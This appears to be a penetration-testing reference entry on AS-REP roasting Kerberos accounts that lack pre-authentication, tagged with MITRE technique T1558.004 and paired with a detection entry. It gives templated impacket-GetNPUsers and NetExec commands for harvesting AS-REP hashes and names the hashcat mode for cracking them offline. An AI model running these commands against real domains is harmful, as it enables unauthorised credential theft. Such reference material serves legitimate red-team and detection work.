---
id: asreproast-getnpusers
title: AS-REP roast (no-preauth accounts)
section: Microsoft Windows Kerberos — TCP 88
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1558.004]
platform: [windows, network]
source: hacktheplanet §"User enum (no creds) + AS-REP roast (no-preauth accounts)"
pair: asrep-probing-4771
---

Accounts with "do not require Kerberos pre-auth" set hand you a crackable AS-REP
without any creds. Enumerate users first, then roast; crack offline with
`hashcat -m 18200`. Each probe is a pre-auth attempt the blue side can count.

```sh
impacket-GetNPUsers {{domain}}/ -dc-ip {{rhost}} -usersfile users.txt -no-pass
nxc ldap {{rhost}} -u {{user}} -p {{password}} --asreproast asrep.txt
```
